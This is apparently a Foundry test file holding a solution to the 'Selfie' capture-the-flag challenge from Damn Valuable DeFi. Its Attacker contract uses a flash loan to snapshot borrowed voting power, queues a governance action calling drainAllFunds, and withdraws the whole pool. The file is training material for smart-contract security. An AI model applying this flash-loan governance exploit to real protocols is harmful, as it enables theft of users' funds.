// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(address(dvtSnapshot), address(simpleGovernance));

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Attacker attackerContract = new Attacker(simpleGovernance, selfiePool, dvtSnapshot);
        attackerContract.attack();

        vm.warp(block.timestamp + simpleGovernance.getActionDelay());

        simpleGovernance.executeAction(attackerContract.actionId());
        attackerContract.withdraw();

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract Attacker {
    SimpleGovernance public simpleGovernance;
    SelfiePool public selfiePool;
    DamnValuableTokenSnapshot public dvtSnapshot;

    address public owner;
    uint256 public actionId;

    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool, DamnValuableTokenSnapshot _dvtSnapshot) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        dvtSnapshot = _dvtSnapshot;
        owner = msg.sender;
    }

    function attack() public {
        selfiePool.flashLoan(dvtSnapshot.balanceOf(address(selfiePool)));
    }

    function receiveTokens(address, uint256 amount) external {
        dvtSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0
        );
        dvtSnapshot.transfer(address(selfiePool), amount);
    }

    function withdraw() public {
        require(msg.sender == owner, "Not owner");
        dvtSnapshot.transfer(owner, dvtSnapshot.balanceOf(address(this)));
    }
}
